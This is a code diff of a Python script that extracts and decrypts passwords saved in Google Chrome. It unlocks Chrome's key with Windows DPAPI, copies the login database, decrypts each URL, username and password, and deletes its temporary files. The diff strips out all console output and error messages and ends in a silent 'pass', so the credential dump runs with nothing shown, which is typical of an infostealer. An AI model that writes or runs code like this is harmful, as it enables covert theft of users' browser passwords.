@@ -26,8 +26,6 @@ def get_secret_key():
         secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
         return secret_key
     except Exception as e:
-        print("%s"%str(e))
-        print("[ERR] Chrome secretkey cannot be found")
         return None
     
 def decrypt_payload(cipher, payload):
@@ -49,18 +47,13 @@ def decrypt_password(ciphertext, secret_key):
         decrypted_pass = decrypted_pass.decode()  
         return decrypted_pass
     except Exception as e:
-        print("%s"%str(e))
-        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
         return ""
     
 def get_db_connection(chrome_path_login_db):
     try:
-        print(chrome_path_login_db)
         shutil.copy2(chrome_path_login_db, "Loginvault.db") 
         return sqlite3.connect("Loginvault.db")
     except Exception as e:
-        print("%s"%str(e))
-        print("[ERR] Chrome database cannot be found")
         return None
         
 if __name__ == '__main__':
@@ -86,7 +79,6 @@ if __name__ == '__main__':
                         ciphertext = login[2]
                         if(url!="" and username!="" and ciphertext!=""):
                             decrypted_password = decrypt_password(ciphertext, secret_key)
-                            print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                             record: str = (
                                 f"\nWebsite:   {url}\n"
                                 f"Username: '{username}'\n"
@@ -102,6 +94,4 @@ if __name__ == '__main__':
                     os.remove("Loginvault.db")
         os.remove('decrypted_password.csv')
     except Exception as e:
-        print("[ERR] "%str(e))
-        
-        
+        pass
